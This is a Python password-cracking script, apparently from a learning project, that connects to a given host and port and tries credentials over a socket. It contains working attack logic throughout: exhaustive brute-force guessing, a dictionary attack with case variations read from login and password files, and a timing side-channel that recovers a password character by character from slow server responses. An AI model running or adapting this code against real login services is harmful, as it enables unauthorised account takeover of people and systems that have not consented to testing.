import argparse
import itertools
import json
import socket
import time

"""
__author__ = "Mack_TB"
__since__ = "28/8/2021"
__version__ = "1.0.5"
"""


def get_arguments():
    parser = argparse.ArgumentParser(description="A script to guess password")
    parser.add_argument("hostname", type=str, help="IP address or domain name")
    parser.add_argument("port", type=int, help="Port number")
    return parser.parse_args()


def bruteforce(cl_socket, characters):
    i = 1
    response = ""
    while response != "Connection success!":
        for tup in itertools.product(characters, repeat=i):
            password = "".join(tup)
            cl_socket.send(password.encode())  # sending through socket

            response = cl_socket.recv(1024)  # receiving the response
            response = response.decode()  # decoding from bytes to string
            if response == "Connection success!":
                print(password)
                break
        i += 1


def bruteforce_with_dict(cl_socket, f):
    for word in f:
        password = word.rstrip("\n")
        chars = [[c] if c.isdigit() else [c, c.upper()] for c in password]
        for tup in itertools.product(*chars):  # test with different cases
            password = "".join(tup)

            cl_socket.send(password.encode())  # sending through socket

            response = cl_socket.recv(1024)  # receiving the response
            response = response.decode()  # decoding from bytes to string
            if response == "Connection success!":
                print(password)
                return


def set_credentials(login, password=""):
    return {
        "login": login,
        "password": password
    }


def send_n_recv(cl_socket, credentials):
    json_str = json.dumps(credentials, indent=4)
    last_time = time.time()
    cl_socket.send(json_str.encode())  # sending through socket

    response = cl_socket.recv(1024)  # receiving the response
    new_cur_time = time.time()
    time_passed = new_cur_time - last_time
    response = response.decode()  # decoding from bytes to string
    return json_str, json.loads(response), time_passed


"""
#  brute force login password with dictionary and catching exception
Try all logins with an empty password.
When finding the login, try out every possible password of length 1.
When an exception occurs, we know that we found the first letter of the password.
Use the found login and the found letter to find the second letter of the password.
Repeat until we receive the "success" message.
"""
def bflp_with_dict_n_ce(cl_socket, f):
    #  searching for a login
    for word in f:
        password = word.rstrip("\n")
        chars = [[c] if c.isdigit() else [c, c.upper()] for c in password]
        for tup in itertools.product(*chars):  # test with different cases
            login = "".join(tup)
            credentials = set_credentials(login)
            response = send_n_recv(cl_socket, credentials)[1]
            if response["result"] == "Wrong password!":
                chars = "abcdefghijklmnopqrstuvwxyz0123456789"
                i = 0
                tmp = ""
                password = ""
                #  searching for a password
                while i < len(chars):
                    for c in [chars[i], chars[i].upper()]:
                        tmp += c
                        credentials = set_credentials(login, tmp)
                        data = send_n_recv(cl_socket, credentials)
                        response = data[1]
                        # print(data[1], data[2])
                        if data[2] >= 0.1:
                            # print("Exception happened during login")
                            password = tmp
                            i = 0
                        elif response["result"] == "Wrong password!":
                            tmp = password
                        # elif response["result"] == "Exception happened during login":
                        #     password = tmp
                        #     i = 0
                        elif response["result"] == "Connection success!":
                            json_str = data[0]
                            print(json_str)
                            return
                    i += 1


if __name__ == "__main__":
    args = get_arguments()

    with socket.socket() as client_socket:  # creating the socket with context manager
        hostname = args.hostname
        port = args.port
        address = (hostname, port)

        client_socket.connect(address)  # connecting to the server

        # chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        # bruteforce(client_socket, chars)

        # path = "C:\\Users\\hp\\PycharmProjects\\password-hack\\hacking\\passwords.txt"
        # with open("passwords.txt", "r") as file:
        #     bruteforce_with_dict(client_socket, file)

        path = "C:\\Users\\hp\\PycharmProjects\\password-hack\\hacking\\logins.txt"
        with open(path, "r") as file:
            bflp_with_dict_n_ce(client_socket, file)
